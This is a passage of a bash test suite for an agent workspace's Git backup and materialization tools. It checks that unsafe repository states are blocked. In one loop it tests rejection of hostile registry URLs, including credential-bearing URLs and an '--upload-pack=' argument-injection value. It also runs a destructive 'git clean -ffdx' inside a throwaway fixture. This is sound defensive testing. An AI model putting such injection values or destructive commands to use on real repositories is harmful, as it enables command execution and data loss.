    fail 'backup fixture: the second backup did not use the incremental object audit'
  # With a verified checkpoint, a lowered fixture-only limit ignores already-backed-up history.
  set +e
  backup_output="$(env "${backup_env[@]}" AGENT_BACKUP_MAX_BLOB_BYTES=1024 \
    AGENT_DIRECTORY_ROOT="$backup_work" bash "$backup_tool" --root-only 2>&1)"
  backup_status=$?
  set -e
  backup_expect_line "ROOT_BACKUP_OK remote=backup branch=main sha=$(backup_git rev-parse HEAD) scope=root-only" \
    'checkpointed backup rescanning no already-verified history'
  # Without the checkpoint the same limit audits full history and stops on the old blob.
  rm -f "$backup_checkpoint_file"
  set +e
  backup_output="$(env "${backup_env[@]}" AGENT_BACKUP_MAX_BLOB_BYTES=1024 \
    AGENT_DIRECTORY_ROOT="$backup_work" bash "$backup_tool" --root-only 2>&1)"
  backup_status=$?
  set -e
  backup_expect_blocked 'oversized-git-object' 'full-history fallback after a missing checkpoint'
  # A corrupt checkpoint also falls back safely and is rewritten by the next success.
  printf 'garbage\n' > "$backup_checkpoint_file"
  backup_run --root-only
  backup_expect_line "ROOT_BACKUP_OK remote=backup branch=main sha=$(backup_git rev-parse HEAD) scope=root-only" \
    'backup after a corrupt checkpoint'
  grep -Fqx "sha=$(backup_git rev-parse HEAD)" "$backup_checkpoint_file" || \
    fail 'backup fixture: a successful backup did not rewrite the corrupt checkpoint'

  write_registry "$independent_revision"
  write_ignore_projection data-pipeline
  backup_git add -A
  backup_git commit -q -m 'fixture: register the Independent Project'
  backup_head="$(backup_git rev-parse HEAD)"

  # --- Unmaterialized state-------------------------------------------------------
  backup_run --dry-run
  backup_expect_blocked 'missing-independent-repository' 'workspace backup before materialization'
  materialize_run --all --check
  materialize_expect_blocked 'missing-independent-repository' 'data-pipeline' '--check on a missing clone'
  backup_run --root-only --dry-run
  backup_expect_line "ROOT_BACKUP_READY remote=backup branch=main sha=$backup_head scope=root-only" \
    'root-only dry run while the Independent clone is missing'

  # --- materializer ------------------------------------------------------------
  materialize_run --all
  materialize_expect_line 'MATERIALIZATION_OK total=1 cloned=1 verified=0' 'fresh clone at the Project root'
  [[ -d "$independent_clone/.git" && ! -L "$independent_clone/.git" ]] || \
    fail 'materializer fixture: projects/data-pipeline/.git is not a real directory'
  [[ "$(cd "$independent_clone" && env "${backup_env[@]}" git rev-parse --show-toplevel)" == \
    "$(cd "$independent_clone" && pwd -P)" ]] || \
    fail 'materializer fixture: the clone toplevel is not the Project root itself'
  [[ ! -e "$independent_clone/repository" ]] || \
    fail 'materializer fixture: a retired repository/ layer was created'
  [[ ! -e "$independent_clone/.gitmodules" ]] || \
    fail 'materializer fixture: the clone was materialized as a submodule'
  [[ -f "$independent_clone/PROJECT.md" && -f "$independent_clone/STATE.md" ]] || \
    fail 'materializer fixture: the adopted revision does not carry PROJECT.md and STATE.md'
  [[ "$(child_git rev-parse HEAD)" == "$independent_revision" ]] || \
    fail 'materializer fixture: HEAD is not the adopted revision'
  [[ -z "$(child_git symbolic-ref --quiet HEAD 2>/dev/null || true)" ]] || \
    fail 'materializer fixture: the adopted revision was not checked out detached'
  [[ -z "$(backup_git ls-files -- projects/data-pipeline)" ]] || \
    fail 'materializer fixture: the root index tracks the Independent Project root'
  materialize_run --all --check
  materialize_expect_line 'MATERIALIZATION_OK total=1 cloned=0 verified=1' 'idempotent --check'

  # A newer remote tip must not silently advance the adopted revision.
  printf 'later work\n' > "$independent_seed/later.txt"
  seed_git add later.txt
  seed_git commit -q -m 'fixture: newer branch tip'
  seed_git push -q origin main
  independent_tip="$(seed_git rev-parse HEAD)"
  materialize_run --all --check
  materialize_expect_line 'MATERIALIZATION_OK total=1 cloned=0 verified=1' '--check against a newer branch tip'
  [[ "$(child_git rev-parse HEAD)" == "$independent_revision" ]] || \
    fail 'materializer fixture: the clone was advanced to the branch tip instead of the adopted revision'

  # --- Healthy workspace backup----------------------------------------------------
  independent_remote_before="$(independent_remote_sha)"
  root_remote_before_dry_run="$(backup_remote_sha)"
  backup_run --dry-run
  backup_expect_line "WORKSPACE_BACKUP_READY remote=backup branch=main sha=$backup_head independent=1" \
    'workspace dry run on a materialized workspace'
  [[ "$(backup_remote_sha)" == "$root_remote_before_dry_run" ]] || \
    fail 'backup fixture: dry run wrote to the root remote'

  backup_run
  backup_expect_line "WORKSPACE_BACKUP_OK remote=backup branch=main sha=$backup_head independent=1" \
    'workspace backup on a materialized workspace'
  [[ "$(backup_remote_sha)" == "$backup_head" ]] || \
    fail 'backup fixture: the root remote does not match local HEAD after push'
  [[ "$(independent_remote_sha)" == "$independent_remote_before" ]] || \
    fail 'backup fixture: the workspace backup pushed to the Independent remote'

  backup_run --root-only --dry-run
  backup_expect_line "ROOT_BACKUP_READY remote=backup branch=main sha=$backup_head scope=root-only" \
    'root-only dry run'
  backup_run --root-only
  backup_expect_line "ROOT_BACKUP_OK remote=backup branch=main sha=$backup_head scope=root-only" \
    'root-only backup'
  [[ "$(independent_remote_sha)" == "$independent_remote_before" ]] || \
    fail 'backup fixture: the root-only backup pushed to the Independent remote'

  # --- Cache boundaries----------------------------------------------------------------
  build_fixture_cache
  if (( backup_status != 0 )); then
    fail 'cache fixture: build-context-cache.sh failed on a materialized workspace'
  else
    if grep -Fq 'projects/data-pipeline/' "$independent_cache_dir/manifest.tsv"; then
      fail 'cache fixture: manifest.tsv registers Independent Project contents'
    fi
    grep -Fq 'projects/REPOSITORIES.md' "$independent_cache_dir/manifest.tsv" || \
      fail 'cache fixture: manifest.tsv omits the root-side registry'
    grep -Fq 'projects/.gitignore' "$independent_cache_dir/manifest.tsv" || \
      fail 'cache fixture: manifest.tsv omits the root-side ignore projection'
    grep -Fq 'projects/embedded-project/PROJECT.md' "$independent_cache_dir/catalog.tsv" || \
      fail 'cache fixture: catalog.tsv does not register the Embedded Project'
    [[ "$(fixture_catalog_field 'projects/data-pipeline/PROJECT.md' 6)" == \
      'fixture contract owned by the child Git' ]] || \
      fail 'cache fixture: catalog.tsv does not carry the adopted revision PROJECT metadata'
    fingerprint_before="$(fixture_fingerprint)"

    printf 'child-only change\n' >> "$independent_clone/source.txt"
    build_fixture_cache
    [[ "$(fixture_fingerprint)" == "$fingerprint_before" ]] || \
      fail 'cache fixture: an Independent code change altered the root cache fingerprint'
    child_git checkout -q -- source.txt

    printf '\n<!-- uncommitted child metadata -->\n' >> "$independent_clone/PROJECT.md"
    build_fixture_cache
    [[ "$(fixture_fingerprint)" == "$fingerprint_before" ]] || \
      fail 'cache fixture: an uncommitted child PROJECT.md change altered the root cache fingerprint'
    child_git checkout -q -- PROJECT.md

    # Advancing the adopted revision changes both the catalog metadata and the fingerprint.
    seed_git checkout -q main
    {
      printf '%s\n' '---' 'name: data-pipeline' 'description: adopted revision two'
      printf '%s\n' 'status: active' 'mode: continuous' '---'
    } > "$independent_seed/PROJECT.md"
    seed_git add PROJECT.md
    seed_git commit -q -m 'fixture: second adopted revision'
    seed_git push -q origin main
    independent_second_revision="$(seed_git rev-parse HEAD)"
    child_git fetch -q origin main
    child_git checkout -q --detach "$independent_second_revision"
    adopt_revision "$independent_second_revision"
    build_fixture_cache
    [[ "$(fixture_fingerprint)" != "$fingerprint_before" ]] || \
      fail 'cache fixture: a new adopted revision did not alter the root cache fingerprint'
    [[ "$(fixture_catalog_field 'projects/data-pipeline/PROJECT.md' 6)" == 'adopted revision two' ]] || \
      fail 'cache fixture: catalog.tsv did not follow the new adopted revision metadata'
    grep -Fq 'child-only change' "$independent_cache_dir/manifest.tsv" && \
      fail 'cache fixture: Independent body content leaked into the manifest'
    backup_git reset -q --hard HEAD~1
    child_git checkout -q --detach "$independent_revision"
    build_fixture_cache
  fi
  # The fixture itself advanced remote main, so measure the invariants below against the new baseline.
  independent_remote_before="$(independent_remote_sha)"

  # --- Negative cases inside the Independent clone----------------------------------------------------
  mkdir -p "$independent_clone/nested/.git"
  backup_run --dry-run
  backup_expect_blocked 'independent-nested-repository' 'a nested repository inside the Independent clone'
  rm -rf "$independent_clone/nested"

  printf '[submodule "vendor"]\n\tpath = vendor\n' > "$independent_clone/.gitmodules"
  backup_run --dry-run
  backup_expect_blocked 'independent-submodule-unsupported' 'a submodule declaration inside the clone'
  rm -f "$independent_clone/.gitmodules"

  printf '*.bin filter=lfs diff=lfs merge=lfs -text\n' > "$independent_clone/.gitattributes"
  backup_run --dry-run
  backup_expect_blocked 'independent-git-lfs-unsupported' 'Git LFS inside the Independent clone'
  rm -f "$independent_clone/.gitattributes"

  printf 'dirty\n' >> "$independent_clone/source.txt"
  backup_run --dry-run
  backup_expect_blocked 'independent-dirty-working-tree' 'a dirty Independent working tree'
  backup_run --root-only --dry-run
  backup_expect_line "ROOT_BACKUP_READY remote=backup branch=main sha=$backup_head scope=root-only" \
    'root-only scope ignoring a dirty Independent clone'
  child_git checkout -q -- source.txt

  printf 'staged\n' >> "$independent_clone/source.txt"
  child_git add source.txt
  backup_run --dry-run
  backup_expect_blocked 'independent-staged-changes' 'a staged Independent change'
  child_git reset -q --hard HEAD

  printf 'stray\n' > "$independent_clone/stray.txt"
  backup_run --dry-run
  backup_expect_blocked 'independent-untracked-files' 'an untracked Independent file'
  rm -f "$independent_clone/stray.txt"

  printf 'stashed\n' >> "$independent_clone/source.txt"
  child_git stash push -q
  backup_run --dry-run
  backup_expect_blocked 'independent-stash-present' 'an Independent stash entry'
  child_git stash drop -q

  child_git tag fixture-local-only "$independent_revision"
  backup_run --dry-run
  backup_expect_blocked 'independent-unpushed-tag' 'a local-only tag'
  child_git tag -d fixture-local-only >/dev/null

  child_git checkout -q -b fixture-unpublished
  child_git commit -q --allow-empty -m 'fixture: unpublished commit'
  child_git checkout -q --detach "$independent_revision"
  backup_run --dry-run
  backup_expect_blocked 'independent-unreachable-local-branch' 'a local branch absent from the remote'
  child_git branch -q -D fixture-unpublished

  # Adopt a commit whose object the remote holds but no branch or tag can reach.
  seed_git checkout -q --detach "$independent_tip"
  seed_git commit -q --allow-empty -m 'fixture: unreferenced revision'
  unreferenced_revision="$(seed_git rev-parse HEAD)"
  seed_git push -q origin 'HEAD:refs/hidden/unreferenced'
  child_git fetch -q origin "$unreferenced_revision"
  child_git checkout -q --detach "$unreferenced_revision"
  adopt_revision "$unreferenced_revision"
  backup_run --dry-run
  backup_expect_blocked 'independent-unpushed-commit' 'a HEAD commit no remote head or tag reaches'
  backup_git reset -q --hard HEAD~1
  child_git checkout -q --detach "$independent_revision"

  adopt_revision '0000000000000000000000000000000000000000'
  backup_run --dry-run
  backup_expect_blocked 'independent-revision-unavailable' 'an adopted revision absent from the remote'
  backup_git reset -q --hard HEAD~1

  # All three Tools must stop when the adopted SHA exists in the clone but HEAD is a different commit.
  child_git checkout -q --detach "$independent_tip"
  backup_run --dry-run
  backup_expect_blocked 'independent-head-not-adopted' 'a HEAD that is not the adopted revision'
  materialize_run --all --check
  materialize_expect_blocked 'repository-head-not-adopted' 'data-pipeline' \
    'a materialized clone parked on a different revision'
  attachment_probe="$( (
    repo_root="$backup_work"
    failures=0
    validate_independent_attachment 'data-pipeline' "$independent_remote_dir" "$independent_revision"
    exit 0
  ) 2>&1 )"
  printf '%s\n' "$attachment_probe" | grep -Fq 'adopts' || \
    fail "validator fixture: validate_independent_attachment accepted a clone parked on a different revision: $attachment_probe"
  child_git checkout -q --detach "$independent_revision"

  child_git remote set-url origin "$backup_remote_dir"
  backup_run --dry-run
  backup_expect_blocked 'repository-origin-mismatch' 'a clone pointing at a different remote'
  child_git remote set-url origin "$independent_remote_dir"

  # An unrelated clone occupying the Project root is also stopped as an origin mismatch.
  env "${backup_env[@]}" git -C "$independent_remote_dir" config uploadpack.allowAnySHA1InWant false

  # --- Attachment negative cases---------------------------------------------------------
  mv "$independent_clone/.git" "$backup_fixture_dir/detached-git"
  printf 'gitdir: %s\n' "$backup_fixture_dir/detached-git" > "$independent_clone/.git"
  backup_run --dry-run
  backup_expect_blocked 'repository-gitfile-unsupported' 'a .git file instead of a real directory'
  rm -f "$independent_clone/.git"
  mv "$backup_fixture_dir/detached-git" "$independent_clone/.git"

  mv "$independent_clone/.git" "$backup_fixture_dir/relocated-git"
  ln -s "$backup_fixture_dir/relocated-git" "$independent_clone/.git"
  backup_run --dry-run
  backup_expect_blocked 'repository-path-symlink' 'a symlinked .git inside the Independent clone'
  rm -f "$independent_clone/.git"
  mv "$backup_fixture_dir/relocated-git" "$independent_clone/.git"

  # When the Project root itself is replaced with a symlink, the `/data-pipeline/` ignore only
  # matches a directory, so the root-side untracked check stops the run before the attachment
  # check is reached. Stopping is the safety requirement; the root-side check fixes the reason first.
  mv "$independent_clone" "$backup_fixture_dir/moved-clone"
  ln -s "$backup_fixture_dir/moved-clone" "$independent_clone"
  backup_run --dry-run
  backup_expect_blocked 'untracked-files' 'a symlinked Independent Project root'
  rm -f "$independent_clone"
  mv "$backup_fixture_dir/moved-clone" "$independent_clone"

  # A registry entry exists but the clone is an empty non-repository.
  mv "$independent_clone" "$backup_fixture_dir/parked-clone"
  mkdir -p "$independent_clone"
  printf 'stray\n' > "$independent_clone/stray.txt"
  backup_run --dry-run
  backup_expect_blocked 'repository-gitfile-unsupported' 'a non-repository directory at the Project root'
  materialize_run --project data-pipeline
  materialize_expect_blocked 'target-not-empty' 'data-pipeline' 'a non-empty non-repository target'
  rm -rf "$independent_clone"
  mv "$backup_fixture_dir/parked-clone" "$independent_clone"

  # --- Root ownership negative cases-------------------------------------------------------
  # `git add` refuses paths under an ignored Project root, so reproduce by registering blobs directly in the index.
  # Register the same content as the working tree, making it a pure ownership violation without dirtying the root.
  for tracked_child_path in source.txt PROJECT.md STATE.md; do
    fixture_tracked_blob="$(backup_git hash-object -w -- "projects/data-pipeline/$tracked_child_path")"
    backup_git update-index --add \
      --cacheinfo "100644,$fixture_tracked_blob,projects/data-pipeline/$tracked_child_path"
    backup_git commit -q -m "fixture: root tracks the Independent $tracked_child_path"
    backup_run --root-only --dry-run
    backup_expect_blocked 'root-tracks-independent-repository' \
      "the root tracking the Independent $tracked_child_path"
    backup_git reset -q --soft HEAD~1
    backup_git reset -q
  done

  backup_git update-index --add --cacheinfo "160000,$independent_revision,projects/data-pipeline"
  backup_git commit -q -m 'fixture: root gitlink'
  backup_run --root-only --dry-run
  backup_expect_blocked 'unsupported-root-gitlink' 'a gitlink in the root index'
  backup_git reset -q --soft HEAD~1
  backup_git reset -q

  # --- Registry and ignore projection negative cases-----------------------------------------
  registry_reject() {
    backup_git commit -q -a -m "fixture: $2"
    backup_run --root-only --dry-run
    backup_expect_blocked "$1" "$2"
    backup_git reset -q --hard HEAD~1
  }

  printf '%s\n' '# REPOSITORIES — Independent Project Registry' '' '## data-pipeline' '' \
    "- repository_url: \`$independent_remote_dir\`" '- repository_reason: `automation`' \
    "- revision: \`$independent_revision\`" > "$fixture_registry"
  registry_reject 'invalid-registry' 'a malformed registry heading'

  {
    printf '%s\n' '# REPOSITORIES — Independent Project Registry' ''
    printf '%s\n' '## `data-pipeline`' ''
    printf -- '- repository_url: `%s`\n' "$independent_remote_dir"
    printf '%s\n' '- repository_reason: `automation`'
    printf -- '- revision: `%s`\n' "$independent_revision"
    printf '%s\n' '' '## `data-pipeline`' ''
    printf -- '- repository_url: `%s`\n' "$independent_remote_dir"
    printf '%s\n' '- repository_reason: `automation`'
    printf -- '- revision: `%s`\n' "$independent_revision"
  } > "$fixture_registry"
  registry_reject 'invalid-registry' 'a duplicate registry name'

  {
    printf '%s\n' '# REPOSITORIES — Independent Project Registry' ''
    printf '%s\n' '## `zeta-project`' ''
    printf -- '- repository_url: `%s`\n' "$independent_remote_dir"
    printf '%s\n' '- repository_reason: `automation`'
    printf -- '- revision: `%s`\n' "$independent_revision"
    printf '%s\n' '' '## `data-pipeline`' ''
    printf -- '- repository_url: `%s`\n' "$independent_remote_dir"
    printf '%s\n' '- repository_reason: `automation`'
    printf -- '- revision: `%s`\n' "$independent_revision"
  } > "$fixture_registry"
  registry_reject 'invalid-registry' 'an unsorted registry'

  write_registry "$independent_revision" 'because-we-want-to'
  registry_reject 'invalid-registry' 'an invalid repository_reason'

  {
    printf '%s\n' '# REPOSITORIES — Independent Project Registry' ''
    printf '%s\n' '## `data-pipeline`' ''
    printf -- '- repository_url: `%s`\n' "$independent_remote_dir"
    printf '%s\n' '- repository_reason: `automation`'
    printf -- '- revision: `%s`\n' "$independent_revision"
    printf '%s\n' '- repository_default_branch: `main`'
  } > "$fixture_registry"
  registry_reject 'invalid-registry' 'an extra registry field'

  {
    printf '%s\n' '# REPOSITORIES — Independent Project Registry' ''
    printf '%s\n' '## `data-pipeline`' ''
    printf -- '- repository_url: `%s`\n' "$independent_remote_dir"
    printf '%s\n' '- repository_reason: `automation`'
  } > "$fixture_registry"
  registry_reject 'invalid-registry' 'a registry entry missing its revision'

  write_registry 'aaaa'
  registry_reject 'invalid-registry' 'a truncated adopted revision'

  for hostile_url in \
    "ssh://fixture:secret@example.invalid/repository.git" \
    "https://example.invalid/repository.git?token=secret" \
    "--upload-pack=/tmp/fixture-pack"; do
    {
      printf '%s\n' '# REPOSITORIES — Independent Project Registry' ''
      printf '%s\n' '## `data-pipeline`' ''
      printf -- '- repository_url: `%s`\n' "$hostile_url"
      printf '%s\n' '- repository_reason: `automation`'
      printf -- '- revision: `%s`\n' "$independent_revision"
    } > "$fixture_registry"
    backup_git commit -q -a -m 'fixture: hostile repository_url'
    backup_run --root-only --dry-run
    backup_expect_blocked 'invalid-registry' "the hostile repository_url $hostile_url"
    printf '%s\n' "$backup_output" | grep -Fq 'secret' && \
      fail "backup fixture: the blocked report leaked a credential from $hostile_url"
    backup_git reset -q --hard HEAD~1
  done

  write_registry "$independent_revision"
  write_ignore_projection
  registry_reject 'invalid-ignore-projection' 'a registry entry missing from the ignore projection'

  write_ignore_projection data-pipeline embedded-project
  registry_reject 'invalid-ignore-projection' 'an Embedded Project inside the ignore projection'

  write_ignore_projection data-pipeline
  # --- Detection of retired layouts-----------------------------------------------------------------
  mkdir -p "$backup_work/projects/embedded-project/repository/.git"
  backup_run --root-only --dry-run
  backup_expect_blocked 'deprecated-repository-layout' 'a clone at the retired repository/ path'
  rm -rf "$backup_work/projects/embedded-project/repository"

  {
    printf '%s\n' '---' 'name: embedded-project' 'description: fixture embedded project'
    printf '%s\n' 'status: active' 'mode: finite' 'repository_mode: embedded' '---'
  } > "$backup_work/projects/embedded-project/PROJECT.md"
  registry_reject 'deprecated-repository-layout' 'a retired repository_mode field'

  {
    printf '%s\n' '---' 'updated_at: 2026-08-03' '---' '' '# Current State' ''
    printf '%s\n' '## Repository State' '' "- revision: \`$independent_revision\`"
  } > "$backup_work/projects/embedded-project/STATE.md"
  registry_reject 'deprecated-repository-layout' 'a retired Repository State section'

  # --- Existing root-side negative cases---------------------------------------------------------------
  mkdir -p "$backup_work/ignored-dir/nested/.git"
  backup_run --dry-run
  backup_expect_blocked 'nested-git-repository' 'an unregistered ignored nested Git repository'
  rm -rf "$backup_work/ignored-dir"

  printf 'dirty\n' >> "$backup_work/AGENTS.md"
  backup_run --dry-run
  backup_expect_blocked 'dirty-working-tree' 'an uncommitted tracked change'
  backup_git checkout -q -- AGENTS.md

  printf 'staged\n' >> "$backup_work/AGENTS.md"
  backup_git add AGENTS.md
  backup_run --dry-run
  backup_expect_blocked 'staged-changes' 'a staged change'
  backup_git reset -q --hard HEAD

  printf 'stray\n' > "$backup_work/stray.md"
  backup_run --dry-run
  backup_expect_blocked 'untracked-files' 'an untracked non-ignored file'
  rm -f "$backup_work/stray.md"

  printf 'stashed\n' >> "$backup_work/AGENTS.md"
  backup_git stash push -q
  backup_run --dry-run
  backup_expect_blocked 'stash-present' 'a stash entry'
  backup_git stash drop -q

  mkdir -p "$backup_work/.tmp"
  printf 'scratch\n' > "$backup_work/.tmp/scratch"
  backup_git add -f .tmp/scratch
  backup_git commit -q -m 'fixture: forbidden path'
  backup_run --dry-run
  backup_expect_blocked 'forbidden-tracked-file' 'a tracked .tmp path'
  backup_git reset -q --hard HEAD~1
  rm -rf "$backup_work/.tmp"

  backup_git checkout -q -b stray-branch
  printf 'unreachable\n' > "$backup_work/unreachable.md"
  backup_git add -A
  backup_git commit -q -m 'fixture: unreachable commit'
  backup_git checkout -q main
  backup_run --dry-run
  backup_expect_blocked 'unreachable-local-branch' 'a commit unreachable from the backup branch'
  backup_git branch -q -D stray-branch

  printf '%04096d' 0 > "$backup_work/oversized.bin"
  backup_git add -A
  backup_git commit -q -m 'fixture: oversized blob'
  set +e
  backup_output="$(env "${backup_env[@]}" AGENT_DIRECTORY_ROOT="$backup_work" \
    AGENT_BACKUP_MAX_BLOB_BYTES=1024 bash "$backup_tool" --root-only --dry-run 2>&1)"
  backup_status=$?
  set -e
  backup_expect_blocked 'oversized-git-object' 'a blob above the size limit'
  printf '%s\n' "$backup_output" | grep -Fq 'oversized.bin' || \
    fail 'backup fixture: the oversized object report does not name the path'
  backup_git reset -q --hard HEAD~1
  rm -f "$backup_work/oversized.bin"

  env "${backup_env[@]}" git clone -q "$backup_remote_dir" "$backup_peer"
  printf 'peer\n' > "$backup_peer/peer.md"
  env "${backup_env[@]}" git -C "$backup_peer" add -A
  env "${backup_env[@]}" git -C "$backup_peer" commit -q -m 'fixture: peer commit'
  env "${backup_env[@]}" git -C "$backup_peer" push -q origin main
  printf 'local\n' > "$backup_work/local.md"
  backup_git add -A
  backup_git commit -q -m 'fixture: local commit'
  backup_sha_before_divergence="$(backup_remote_sha)"
  backup_run
  backup_expect_blocked 'remote-diverged' 'a diverged remote'
  printf '%s\n' "$backup_output" | grep -Eq "remote=$backup_sha_before_divergence local=[0-9a-f]{40}" || \
    fail 'backup fixture: the divergence report does not name both the remote and local SHA'
  [[ "$(backup_remote_sha)" == "$backup_sha_before_divergence" ]] || \
    fail 'backup fixture: the remote changed while divergence was reported'
  backup_run --dry-run
  backup_expect_blocked 'remote-diverged' 'a diverged remote in dry run'
  [[ "$(backup_remote_sha)" == "$backup_sha_before_divergence" ]] || \
    fail 'backup fixture: the dry run changed the remote'

  # --- Prove the danger of root git clean only in a throwaway fixture-----------------------------
  clean_probe_dir="$backup_fixture_dir/clean-probe"
  mkdir -p "$clean_probe_dir/projects/probe"
  printf '# Derived from projects/REPOSITORIES.md.\n# BEGIN INDEPENDENT PROJECTS\n/probe/\n# END INDEPENDENT PROJECTS\n' \
    > "$clean_probe_dir/projects/.gitignore"
  printf 'unpushed work\n' > "$clean_probe_dir/projects/probe/unpushed.txt"
  env "${backup_env[@]}" git init -q "$clean_probe_dir"
  env "${backup_env[@]}" git -C "$clean_probe_dir" add -A
  env "${backup_env[@]}" git -C "$clean_probe_dir" commit -q -m 'fixture: clean probe'
  env "${backup_env[@]}" git -C "$clean_probe_dir" clean -q -ffdx
  [[ ! -e "$clean_probe_dir/projects/probe/unpushed.txt" ]] || \
    fail 'clean probe fixture: the ignored Independent Project root unexpectedly survived git clean -ffdx'
  rm -rf "$clean_probe_dir"

  [[ -z "$(backup_git status --porcelain)" ]] || \
    fail 'backup fixture: the backup tool left the working tree modified'
  [[ -z "$(child_git status --porcelain)" ]] || \
    fail 'backup fixture: the backup tool left the Independent clone modified'
  [[ "$(child_git rev-parse HEAD)" == "$independent_revision" ]] || \
    fail 'backup fixture: the backup tool moved the Independent clone HEAD'
  [[ "$(independent_remote_sha)" == "$independent_remote_before" ]] || \
    fail 'backup fixture: the Independent remote changed during the whole fixture run'
fi

  fixture_root="$repo_root/evals/fixtures/context-search"
  if ! result="$(AGENT_DIRECTORY_ROOT="$fixture_root" AGENT_CACHE_DIR="$fixture_cache_dir" \
    bash "$repo_root/tools/find-context.sh" --route knowledge --limit 5 -- '資本配分')"; then
    fail 'find-context.sh failed on context-search fixture'
  else
    printf '%s\n' "$result" | grep -Fq 'capital-allocation-current' || fail 'context search did not return active Knowledge'
    if printf '%s\n' "$result" | grep -Fq 'capital-allocation-old'; then
      fail 'context search returned superseded Knowledge by default'
    fi
    result_count="$(printf '%s\n' "$result" | tail -n +2 | grep -c . || true)"
    (( result_count <= 5 )) || fail 'context search returned more than 5 candidates'
  fi
  project_result="$(AGENT_DIRECTORY_ROOT="$fixture_root" AGENT_CACHE_DIR="$fixture_cache_dir" \
    bash "$repo_root/tools/find-context.sh" --route project --limit 5 -- '市場判断' || true)"
  printf '%s\n' "$project_result" | grep -Fq $'project\tproject\tactive\tmarket-review\t' || \
    fail 'context search did not return active Project'
  if printf '%s\n' "$project_result" | grep -Fq 'market-review-2025'; then
    fail 'context search returned completed Project by default'
  fi

  if command -v sqlite3 >/dev/null 2>&1 && \
    sqlite3 ':memory:' "CREATE VIRTUAL TABLE fts_probe USING fts5(body, tokenize='trigram');" >/dev/null 2>&1; then
    if ! AGENT_DIRECTORY_ROOT="$fixture_root" AGENT_CACHE_DIR="$sqlite_fixture_cache_dir" \
      AGENT_SQLITE_KNOWLEDGE_THRESHOLD=1 AGENT_SQLITE_CATALOG_THRESHOLD=1 \
      bash "$repo_root/tools/build-context-cache.sh" >/dev/null; then
      fail 'scale-triggered SQLite cache generation failed'
    elif [[ ! -f "$sqlite_fixture_cache_dir/search.sqlite" ]] || \
      ! grep -Fqx 'search_backend=sqlite-fts5' "$sqlite_fixture_cache_dir/cache.meta"; then
      fail 'scale threshold did not activate SQLite FTS5'
    elif [[ "$(sqlite3 "$sqlite_fixture_cache_dir/search.sqlite" 'PRAGMA integrity_check;')" != 'ok' ]]; then
      fail 'scale-triggered SQLite cache failed integrity_check'
    else
      sqlite_result="$(AGENT_DIRECTORY_ROOT="$fixture_root" AGENT_CACHE_DIR="$sqlite_fixture_cache_dir" \
        AGENT_SQLITE_KNOWLEDGE_THRESHOLD=1 AGENT_SQLITE_CATALOG_THRESHOLD=1 \
        bash "$repo_root/tools/find-context.sh" --route knowledge --limit 5 -- '投下先ごとの期待収益' || true)"
      printf '%s\n' "$sqlite_result" | grep -Fq 'capital-allocation-current' || \
        fail 'SQLite FTS5 did not retrieve body-only Japanese text'
      printf 'corrupted fixture' > "$sqlite_fixture_cache_dir/search.sqlite"
      recovery_result="$(AGENT_DIRECTORY_ROOT="$fixture_root" AGENT_CACHE_DIR="$sqlite_fixture_cache_dir" \
        AGENT_SQLITE_KNOWLEDGE_THRESHOLD=1 AGENT_SQLITE_CATALOG_THRESHOLD=1 \
        bash "$repo_root/tools/find-context.sh" --route knowledge --limit 5 -- '投下先ごとの期待収益' || true)"
      printf '%s\n' "$recovery_result" | grep -Fq 'capital-allocation-current' || \
        fail 'find-context.sh did not rebuild a corrupted SQLite cache'
    fi
  fi

  # --- Routine integration fixture (canon: routines/ROUTINES.md)-----------------------------------
  # Never touch the real crontab, real LaunchAgents, or real Provider APIs; verify only with an isolated copy, mocks, and a temporary HOME.
  routine_fixture_dir="$(mktemp -d "${TMPDIR:-/tmp}/agent-validator-routine.XXXXXX")"
  cleanup_paths+=("$routine_fixture_dir")
  routine_work="$routine_fixture_dir/work"
  mkdir -p "$routine_work"
  real_head_before_routine_fixture=''
  if git -C "$repo_root" rev-parse HEAD >/dev/null 2>&1; then
    real_head_before_routine_fixture="$(git -C "$repo_root" rev-parse HEAD)"
  fi
  # Faithfully copy the real repo's tracked plus non-ignored working tree. Independent clones and .agent-cache are excluded by ignore rules.
  routine_copy_list="$routine_fixture_dir/copied.paths"
  : > "$routine_copy_list"
  while IFS= read -r routine_copy_path; do
    [[ -n "$routine_copy_path" && -f "$repo_root/$routine_copy_path" ]] || continue
    routine_copy_parent="$routine_work/${routine_copy_path%/*}"
    [[ "$routine_copy_path" == */* ]] || routine_copy_parent="$routine_work"
    mkdir -p "$routine_copy_parent"
    cp -p "$repo_root/$routine_copy_path" "$routine_work/$routine_copy_path"
    printf '%s\n' "$routine_copy_path" >> "$routine_copy_list"
  done < <(git -C "$repo_root" ls-files -co --exclude-standard 2>/dev/null | LC_ALL=C sort -u)

  routine_env=(HOME="$routine_fixture_dir" GIT_CONFIG_NOSYSTEM=1
    GIT_AUTHOR_NAME=fixture GIT_AUTHOR_EMAIL=fixture@example.invalid
    GIT_COMMITTER_NAME=fixture GIT_COMMITTER_EMAIL=fixture@example.invalid
    AGENT_VALIDATOR_NESTED_FIXTURE=1)
  routine_git() { env "${routine_env[@]}" git -C "$routine_work" "$@"; }
  routine_git init -q
  routine_git symbolic-ref HEAD refs/heads/main
  # Paths hidden by the fixture's ignore projection (e.g. under evals/fixtures) are tracked explicitly, as in the real repo.
  tr '\n' '\0' < "$routine_copy_list" | \
    env "${routine_env[@]}" xargs -0 git -C "$routine_work" add -f --
  routine_git commit -q -m 'fixture: routine workspace'
  routine_base_sha="$(routine_git rev-parse HEAD)"

  routine_state_dir="$routine_work/.agent-cache/routines/state"
  seed_routine_last_full() {
    mkdir -p "$routine_state_dir"
    date +%s > "$routine_state_dir/maintenance-last-full"
  }
  routine_extra_env=()
  routine_output=''
  routine_status=0
  routine_run() {
    set +e
    routine_output="$(env "${routine_env[@]}" ${routine_extra_env[@]+"${routine_extra_env[@]}"} \
      AGENT_DIRECTORY_ROOT="$routine_work" bash "$routine_work/tools/run-routine.sh" "$@" 2>/dev/null)"
    routine_status=$?
    set -e
  }
  routine_expect() {
    printf '%s\n' "$routine_output" | grep -Fq -- "$1" || \
      fail "routine fixture: $2 did not report: $1 (got: $(printf '%s' "$routine_output" | tail -n 1))"
  }
  routine_expect_clean() {
    [[ -z "$(routine_git status --porcelain)" ]] || \
      fail "routine fixture: $1 left the working tree modified"
  }

  # Nested real-validator runs dominate --full wall time (~3s × 17 invocations on near-identical
  # content). Keep the real validator only for representative runs (the PASS path on the clean
  # tree and the first FAIL path on the broken probe); every other run uses a stand-in that
  # checks exactly the property the probe exercises (the Wiki topic status vocabulary) with the
  # real validator's FAIL wording, so every expectation below still sees real findings.
